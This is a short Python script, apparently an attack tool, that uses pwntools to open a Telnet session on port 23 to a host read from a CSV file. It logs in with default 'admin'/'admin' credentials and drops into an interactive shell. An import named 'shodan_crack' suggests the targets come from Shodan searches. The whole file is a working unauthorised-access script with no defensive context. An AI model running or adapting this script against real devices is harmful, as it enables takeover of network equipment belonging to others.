from pwn import *
from h3cMass import shodan_crack
import time

host = open('host.csv', 'r')
host1 = host.read()

r = remote(host1, 23) 
time.sleep(1)
r.send("admin\r")
time.sleep(1)
print "[+] > " + r.recv()
time.sleep(1)
r.send("admin\n")
print "[+] > " + r.recv()
r.interactive() #interactive mode

host.close()
